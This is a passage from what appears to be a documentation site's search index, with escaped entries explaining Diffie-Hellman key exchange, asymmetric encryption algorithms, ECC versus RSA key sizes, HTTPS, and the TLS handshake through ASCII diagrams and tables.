Key\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\nAlice derives AES key: f2ca1bb6c7e907d06dafe4687e579fce76b37e...\nBob derives AES key:   f2ca1bb6c7e907d06dafe4687e579fce76b37e...\nKeys match: True \u2705\n\n\ud83d\udcac STEP 7: Secure Communication (using shared AES key)\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\nAlice's plaintext: Hello Bob! This is a secret message.\nEncrypted: 7f8e3a2d9c1b4f6a8e5d3c7b2a9f1e4d8c6b5a...\nNonce:     a3f2e1d9c8b7a6f5\nTag:       9e2d4c7a1b8f6e3d\n\nBob decrypts: Hello Bob! This is a secret message.\n\u2705 Message successfully exchanged over insecure channel!\n</code></pre></p> <p>Key Takeaways:</p> <pre><code>\u2705 DIFFIE-HELLMAN SOLVES:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n1. Key Distribution Problem\n   \u2022 No need to share secret key beforehand\n   \u2022 Works over completely insecure channels\n\n2. Perfect Forward Secrecy\n   \u2022 Each session uses ephemeral (temporary) keys\n   \u2022 Compromising one session doesn't affect others\n\n3. Enables Hybrid Encryption\n   \u2022 DH: Slow, establishes shared secret\n   \u2022 AES: Fast, encrypts actual data\n   \u2022 Best of both worlds!\n\n\u26a0\ufe0f  IMPORTANT NOTES:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n1. Vulnerable to Man-in-the-Middle (MITM) attacks\n   \u2022 Solution: Combine with authentication (digital signatures)\n   \u2022 Example: TLS uses DH + certificates\n\n2. Not an Encryption Algorithm\n   \u2022 Only for key exchange\n   \u2022 Must use with symmetric cipher (AES)\n\n3. Quantum Threat\n   \u2022 Shor's algorithm can break DH on quantum computers\n   \u2022 Post-quantum alternatives being developed\n\n\ud83c\udf1f REAL-WORLD USAGE:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\u2022 TLS/HTTPS: Every secure website\n\u2022 SSH: Secure remote access\n\u2022 VPN: IPSec, WireGuard\n\u2022 Signal/WhatsApp: End-to-end encryption\n\u2022 Bitcoin/Blockchain: Key agreement\n</code></pre>"},{"location":"security/encryption/#asymmetric-encryption-public-key-cryptography","title":"Asymmetric Encryption (Public Key Cryptography)","text":"<p>Definition: Encryption method that uses two different keys: a public key (for encryption) and a private key (for decryption).</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502              Asymmetric Encryption                           \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\n                    RECEIVER GENERATES KEY PAIR\n                    \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n                    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n                    \u2502    Key Generator     \u2502\n                    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n                               \u2502\n                \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n                \u2502                             \u2502\n         \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u25bc\u2500\u2500\u2500\u2500\u2500\u2510              \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25bc\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n         \u2502   Public   \u2502              \u2502   Private    \u2502\n         \u2502    Key     \u2502              \u2502     Key      \u2502\n         \u2502 (Share)    \u2502              \u2502 (Keep Secret)\u2502\n         \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2518              \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n                \u2502                            \u2502\n                \u2502 Shared publicly            \u2502 Never shared\n                \u2502                            \u2502\n                \u2502                            \u2502\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25bc\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510                   \u2502\n\u2502      SENDER            \u2502                   \u2502\n\u2502                        \u2502                   \u2502\n\u2502  Plaintext: \"Hello\"    \u2502                   \u2502\n\u2502       +                \u2502                   \u2502\n\u2502  Public Key (Receiver) \u2502                   \u2502\n\u2502       \u2193                \u2502                   \u2502\n\u2502  Encryption Algorithm  \u2502                   \u2502\n\u2502       \u2193                \u2502                   \u2502\n\u2502  Ciphertext:\"xK9#mP2$\" \u2502                   \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518                   \u2502\n            \u2502                                \u2502\n            \u2502 Send ciphertext                \u2502\n            \u2502                                \u2502\n            \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n                         \u2502\n                \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25bc\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n                \u2502    TRANSMISSION     \u2502\n                \u2502   (Over Network)    \u2502\n                \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n                         \u2502\n            \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25bc\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n            \u2502        RECEIVER             \u2502\n            \u2502                             \u2502\n            \u2502  Ciphertext: \"xK9#mP2$\"     \u2502\n            \u2502         +                   \u2502\n            \u2502  Private Key (Receiver)     \u2502\n            \u2502         \u2193                   \u2502\n            \u2502  Decryption Algorithm       \u2502\n            \u2502         \u2193                   \u2502\n            \u2502  Plaintext: \"Hello\"         \u2502\n            \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nKEY CHARACTERISTICS:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\u2022 Public Key: Can be shared with anyone\n\u2022 Private Key: Must be kept secret\n\u2022 Data encrypted with public key can ONLY be decrypted with private key\n\u2022 Mathematically related but computationally infeasible to derive private from public\n</code></pre>"},{"location":"security/encryption/#asymmetric-encryption-algorithms","title":"Asymmetric Encryption Algorithms","text":"<p>Evolution and Improvements:</p> Algorithm Key Size Year Based On Status Use Case RSA 1024-4096 bit 1977 Factorization \u2705 Current Standard Encryption, Signatures DSA 1024-3072 bit 1991 Discrete Log \u2705 Digital Signatures Signatures only Diffie-Hellman 2048+ bit 1976 Discrete Log \u2705 Key Exchange Key agreement ECC (Elliptic Curve) 256-521 bit 1985 Elliptic Curves \u2705 Modern Standard Encryption, Signatures ECDSA 256-521 bit 1992 ECC \u2705 Modern Digital Signatures EdDSA 255 bit 2011 ECC \u2705 Best Performance Modern Signatures El Gamal 1024+ bit 1985 Discrete Log \u26a0\ufe0f Less Common Encryption <p>Modern Algorithm: ECC (Elliptic Curve Cryptography)</p> <p>Advantages of ECC over RSA: - \u2705 Smaller Keys: 256-bit ECC \u2248 3072-bit RSA (same security) - \u2705 Faster: Quicker key generation and signing - \u2705 Less Bandwidth: Smaller certificates and signatures - \u2705 Mobile Friendly: Lower CPU and power consumption - \u2705 Future Proof: Better resistance to quantum attacks (relatively) - \u2705 NSA Approved: Suite B cryptography</p> <p>Key Size Comparison: <pre><code>Security Level:    80-bit   112-bit   128-bit   192-bit   256-bit\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\nRSA Key Size:      1024     2048      3072      7680      15360\nECC Key Size:      160      224       256       384       512\nDH Key Size:       1024     2048      3072      7680      15360\n\nExample: Same security, much smaller!\n   RSA-3072:  \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3072 bits)\n   ECC-256:   \u2588\u2588\u2588\u2588 (256 bits)\n</code></pre></p> <p>Modern Algorithms: - Ed25519 (EdDSA): Modern, fast, secure signatures (SSH, TLS 1.3) - X25519 (ECDH): Modern key exchange (Signal, WhatsApp) - P-256 (NIST): Widely supported ECC curve - RSA-2048/4096: Still widely used, reliable</p>"},{"location":"security/encryption/#asymmetric-encryption-use-cases","title":"Asymmetric Encryption Use Cases","text":"<pre><code>\u2705 RECOMMENDED USE CASES:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\n1. SECURE KEY EXCHANGE\n   \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510                          \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n   \u2502  Alice   \u2502  Encrypt session key     \u2502   Bob    \u2502\n   \u2502          \u2502\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25b6\u2502          \u2502\n   \u2502          \u2502  using Bob's public key  \u2502          \u2502\n   \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518                          \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\n   Problem: How to share symmetric key securely?\n   Solution: Encrypt symmetric key with public key!\n\n2. DIGITAL SIGNATURES\n   \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n   \u2502   Document   \u2502\n   \u2502      +       \u2502      Prove authenticity\n   \u2502 Private Key  \u2502      Non-repudiation\n   \u2502      \u2193       \u2502      Verify with public key\n   \u2502  Signature   \u2502\n   \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\n3. SSL/TLS HANDSHAKE\n   Client \u2500\u2500\u2500\u2500\u25b6 Server\n          Request server's public key\n   Client \u25c0\u2500\u2500\u2500\u2500 Server\n          Send public key (in certificate)\n   Client \u2500\u2500\u2500\u2500\u25b6 Server\n          Send encrypted session key\n\n4. EMAIL ENCRYPTION (PGP/S/MIME)\n   Sender \u2500\u2500\u2500\u2500\u25b6 Encrypt with recipient's public key\n          \u2500\u2500\u2500\u2500\u25b6 Send encrypted email\n   Recipient \u2500\u25b6 Decrypt with own private key\n\n5. CODE SIGNING\n   Developer \u2500\u2500\u25b6 Sign software with private key\n   User \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25b6 Verify with developer's public key\n\n6. CRYPTOCURRENCY\n   Private Key \u2500\u2500\u25b6 Sign transactions\n   Public Key \u2500\u2500\u2500\u25b6 Verify ownership (wallet address)\n</code></pre> <p>Advantages: - \ud83d\udd11 Key Distribution: No need to share secret keys - \ud83d\udc65 Scalability: Each user needs only one key pair - \u270d\ufe0f Digital Signatures: Provides authentication and non-repudiation - \ud83d\udd12 Security: Private key never needs to be transmitted</p> <p>Disadvantages: - \ud83d\udc0c Slow: 100-1000x slower than symmetric encryption - \ud83d\udcbb Resource Intensive: Higher CPU usage - \ud83d\udcca Limited Data: Not suitable for bulk data encryption - \ud83d\udd22 Key Size: Larger keys needed for same security level (RSA)</p>"},{"location":"security/encryption/#comparison-symmetric-vs-asymmetric","title":"Comparison: Symmetric vs Asymmetric","text":"<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502         Symmetric vs Asymmetric Encryption                   \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nFeature             Symmetric           Asymmetric\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\nKeys                1 (shared)          2 (public + private)\nSpeed               \u26a1 Very Fast         \ud83d\udc0c Slow (100-1000x)\nKey Size            128-256 bits        2048-4096 bits (RSA)\n                                        256-521 bits (ECC)\nKey Distribution    \u274c Difficult         \u2705 Easy\nUse Case            Bulk data           Key exchange, signatures\nExamples            AES, ChaCha20       RSA, ECC, Ed25519\nScalability         \u274c Poor (n\u00b2 keys)    \u2705 Good (2n keys)\nSecurity            Strong with         Strong, math-based\n                    large key\nCPU Usage           Low                 High\nPower               Efficient           Power-hungry\n\nHYBRID APPROACH (Best Practice):\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n1. Use asymmetric encryption to exchange symmetric key\n2. Use symmetric encryption for actual data\n3. Get benefits of both: Security + Performance\n</code></pre>"},{"location":"security/encryption/#https-secure-http","title":"HTTPS: Secure HTTP","text":"<p>What is HTTPS?</p> <p>HTTPS (Hypertext Transfer Protocol Secure) is HTTP with encryption, authentication, and integrity protection. It uses TLS (Transport Layer Security), formerly SSL, to secure the connection.</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502                HTTP vs HTTPS                                 \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nHTTP (Insecure):\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\nBrowser                          Server\n   \u2502                                \u2502\n   \u2502  GET /login.html (plaintext)  \u2502\n   \u2502\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25b6\u2502\n   \u2502                                \u2502\n   \u2502  username=alice&amp;pass=123       \u2502\n   \u2502\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25b6\u2502\n   \u2502      (Visible to attackers!)   \u2502\n\n   \u274c No Encryption\n   \u274c No Authentication\n   \u274c No Integrity\n\nHTTPS (Secure):\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\nBrowser                          Server\n   \u2502                                \u2502\n   \u2502  1. TLS Handshake              \u2502\n   \u2502\u25c0\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25b6\u2502\n   \u2502     (Establish encrypted       \u2502\n   \u2502      connection)               \u2502\n   \u2502                                \u2502\n   \u2502  2. Encrypted Request          \u2502\n   \u2502  \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588          \u2502\n   \u2502\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25b6\u2502\n   \u2502                                \u2502\n   \u2502  3. Encrypted Response         \u2502\n   \u2502  \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588          \u2502\n   \u2502\u25c0\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2502\n\n   \u2705 Encryption (Confidentiality)\n   \u2705 Authentication (Server identity)\n   \u2705 Integrity (Tamper detection)\n</code></pre>"},{"location":"security/encryption/#https-security-features","title":"HTTPS Security Features","text":"<p>Three Pillars of HTTPS:</p> <ol> <li>Encryption (Confidentiality)</li> <li>Data is encrypted during transmission</li> <li>Attackers cannot read the content</li> <li> <p>Uses symmetric encryption (AES)</p> </li> <li> <p>Authentication</p> </li> <li>Verify server's identity</li> <li>Prevent man-in-the-middle attacks</li> <li> <p>Uses digital certificates</p> </li> <li> <p>Integrity</p> </li> <li>Detect if data was tampered</li> <li>Uses MAC (Message Authentication Code)</li> <li>Ensures data arrives unchanged</li> </ol>"},{"location":"security/encryption/#tls-handshake-process","title":"TLS Handshake Process","text":"<p>The TLS handshake establishes a secure connection using both asymmetric and symmetric encryption:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502          TLS Handshake (How HTTPS Works)                    \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nCLIENT (Browser)                         SERVER (Web Server)\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500                        \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\nStep 1: Client Hello\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\u2502 ClientHello                              \u2502\n\u2502 - TLS version: 1.3                       \u2502\n\u2502 - Cipher suites supported                \u2502\n\u2502 - Random number (Client Random)          \u2502\n\u2502\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25b6\u2502\n                                            \u2502\nStep 2: Server Hello                       \u2502\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\u2502                                           \u2502 ServerHello\n\u2502                                           \u2502 - TLS version: 1.3\n\u2502                                           \u2502 - Chosen cipher\n\u2502                                           \u2502 - Random (Server Random)\n\u2502\u25c0\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2502\n\u2502                                           \u2502\nStep 3: Server Certificate                 \u2502\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\u2502                                           \u2502 Certificate\n\u2502                                           \u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502                                           \u2502 \u2502 Server Cert     \u2502\n\u2502                                           \u2502 \u2502 - Domain name   \u2502\n\u2502                                           \u2502 \u2502 - Public Key    \u2502\n\u2502\u25c0\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2502 \u2502 - CA Signature  \u2502\n\u2502                                           \u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\u2502 Verify Certificate:                       \u2502\n\u2502 \u2713 Valid CA signature?                     \u2502\n\u2502 \u2713 Domain name matches?                    \u2502\n\u2502 \u2713 Not expired?                            \u2502\n\u2502 \u2713 Not revoked?                            \u2502\n\u2502                                           \u2502\nStep 4: Key Exchange (Asymmetric Encryption)\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\u2502 Generate Pre-Master Secret                \u2502\n\u2502 Encrypt with Server's Public Key          \u2502\n\u2502 (from certificate)                         \u2502\n\u2502                                           \u2502\n\u2502 Encrypted Pre-Master Secret               \u2502\n\u2502\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25b6\u2502\n\u2502                                           \u2502 Decrypt with Private Key\n\u2502                                           \u2502\nBoth sides now compute Session Keys:       \u2502\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\u2502 Session Key = f(                          \u2502 Session Key = f(\n\u2502   Pre-Master Secret,                      \u2502 